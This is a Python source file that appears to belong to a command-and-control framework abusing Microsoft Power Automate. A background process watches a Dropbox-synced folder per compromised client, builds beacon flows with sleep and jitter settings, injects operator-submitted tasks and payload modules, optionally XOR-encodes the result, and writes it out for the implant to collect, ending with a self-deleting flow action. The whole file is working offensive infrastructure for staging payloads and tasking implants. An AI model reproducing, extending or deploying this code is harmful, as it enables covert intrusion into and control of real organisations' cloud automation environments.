from typing import List
import os
import json
import logging
import multiprocessing
from datetime import datetime
from time import sleep
from .config import init_db_session
from app.models import Client, FlowManagement, Task, Connection, User
from pypowerautomate.actions import RawActions, ScopeStatement, DeleteFlowAction
from app.flow.beacon import DropboxBeacon
from app.flow.payloads import PAYLOAD_MODULES


class PutPayloadProcess(multiprocessing.Process):
    """
    Dropboxがマウントされたフォルダを監視し、DBのTask情報に基づきペイロードを設置する
    """
    def __init__(self, log_queue, db_uri, monitor_path, sleep_time, jitter, has_approval):
        super().__init__()
        self.log_queue = log_queue
        self.daemon = True
        self.running = True
        self.monitor_path = monitor_path
        self.db_uri = db_uri
        self.sleep_time = sleep_time
        self.jitter = jitter
        self.has_approval = has_approval
    
    def run(self):
        # setup logger
        queue_hadler = logging.handlers.QueueHandler(self.log_queue)
        logger = logging.getLogger(__class__.__name__)
        logger.addHandler(queue_hadler)
        logger.setLevel(logging.INFO)

        logger.info(f"{self.__class__.__name__} started.(Multiprocess ver.)")
        session = init_db_session(self.db_uri)
        while self.running:
            clients = session.query(Client).all()
            for client in clients:
                if client.method != "dropbox":
                    continue

                client_path = os.path.join(self.monitor_path, client.client_id)
                # check client path
                if not os.path.exists(client_path):
                    continue

                # previous paylod is not downloaded yet
                payload_path = os.path.join(client_path,"payload")
                if os.path.exists(payload_path):
                    continue
                
                # skip payload generation if init payload is not created yet.
                client_path_ctime = datetime.fromtimestamp(os.path.getctime(client_path))
                current_time = datetime.now()
                if (current_time - client_path_ctime).total_seconds() < 5:
                    continue

                # get user and flowmanagement
                flowmanagement: FlowManagement = session.query(FlowManagement).get(client.flowmanagement_id)
                user:User = flowmanagement.get_user()
                email = None
                if user:
                    email = user.email

                # generate base beacon
                beacon = DropboxBeacon(client.flowmanagement_id,
                                        client.client_id,
                                        client.c2_connection,
                                        client.is_encoded,
                                        client.xor_key,
                                        is_init=False,
                                        sleep_time=self.sleep_time,
                                        jitter=self.jitter,
                                        has_approval=self.has_approval,
                                        email=email)

                # update connections
                if user:
                    user_id = user.user_id
                    connections = session.query(Connection).get(user_id)
                    connections_data = json.loads(connections.data)
                    beacon.set_connections_data(connections_data)
                    beacon.update_connections()
                
                flow = beacon.generate_flow()
                
                # process tasks
                tasks:List[Task] = session.query(Task).filter_by(client_id=client.client_id, state="submitted").all()

                for task in tasks:
                    payload = None
                    if task.task_type == "Raw":
                        actions = RawActions(json.loads(task.task_raw))
                        flow.add_top_action(ScopeStatement(task.task_id, actions))
                        logger.info(f"Process Task ID: {task.task_id}")
                        # update task state
                        task.updated_at = datetime.utcnow()
                        task.processed_at = datetime.utcnow()
                        task.state = "processed"
                        session.commit()
                    else:
                        cls = PAYLOAD_MODULES.get(task.task_type+"Payload")
                        kwargs = json.loads(task.task_args)
                        if cls:
                            payload = cls(**kwargs, mode="dropbox", task_id=task.task_id)
                            flow.add_top_action(payload.generate_payload())
                            logger.info(f"Process Task ID: {task.task_id}")
                            # update task state
                            task.updated_at = datetime.utcnow()
                            task.processed_at = datetime.utcnow()
                            task.state = "processing"
                            session.commit()

                # Convert DeleteFlowAction to wait all until all task finish (similer to "await")
                # Find the edge nodes and termination node which is DeleteFlowAction
                action_name_set = set(flow.root_actions.nodes.keys()) # nodes connect to delete flow action. 
                delete_action = None # termination node

                if "root" in action_name_set:
                    action_name_set.remove("root")

                for name, action in flow.root_actions.nodes.items():
                    if action.runafter:
                        for name in action.runafter.keys():
                            if name in action_name_set:
                                action_name_set.remove(name)

                for name in list(action_name_set):
                    if isinstance(flow.root_actions.nodes[name],DeleteFlowAction):
                        delete_action = name
                        action_name_set.remove(delete_action)

                # update delete flow action
                if delete_action:
                    for name in list(action_name_set):
                        flow.root_actions.nodes[delete_action].runafter[name] = ['Succeeded', 'Failed', 'Skipped', 'TimedOut']

                # write payload
                if client.is_encoded:
                    contents = flow.export_json(client.xor_key)
                else:
                    contents = flow.export_json()
                with open(payload_path,"w") as f:
                    f.write(contents)
                    logger.info(f"Write payload for ClientID:{client.client_id}")
            sleep(1)
        
